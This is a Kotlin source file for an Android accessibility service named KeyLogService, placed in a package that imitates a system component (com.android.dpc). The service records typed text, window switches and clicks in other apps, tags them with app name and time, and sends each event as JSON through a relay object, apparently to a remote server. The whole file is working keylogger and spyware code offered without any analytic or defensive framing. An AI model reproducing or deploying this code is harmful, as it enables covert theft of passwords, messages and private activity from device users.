package com.android.dpc

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.google.gson.Gson

class KeyLogService : AccessibilityService() {
    
    private val gson = Gson()
    
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event?.let { e ->
            when (e.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    captureTextChange(e)
                }
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    captureWindowChange(e)
                }
                AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                    captureClick(e)
                }
            }
        }
    }
    
    private fun captureTextChange(event: AccessibilityEvent) {
        val text = event.text?.joinToString(" ") ?: ""
        if (text.isNotBlank()) {
            val data = mapOf(
                "type" to "keylog",
                "text" to text,
                "package" to event.packageName.toString(),
                "timestamp" to System.currentTimeMillis()
            )
            WsRelay.send(gson.toJson(data))
        }
    }
    
    private fun captureWindowChange(event: AccessibilityEvent) {
        val windowInfo = mapOf(
            "type" to "window_change",
            "package" to event.packageName.toString(),
            "className" to event.className.toString(),
            "timestamp" to System.currentTimeMillis()
        )
        WsRelay.send(gson.toJson(windowInfo))
    }
    
    private fun captureClick(event: AccessibilityEvent) {
        val clickInfo = mapOf(
            "type" to "click",
            "package" to event.packageName.toString(),
            "text" to (event.text?.joinToString(" ") ?: ""),
            "timestamp" to System.currentTimeMillis()
        )
        WsRelay.send(gson.toJson(clickInfo))
    }
    
    override fun onInterrupt() {
        // Serviço interrompido
    }
    
    override fun onServiceConnected() {
        super.onServiceConnected()
        // Configurações adicionais se necessário
    }
}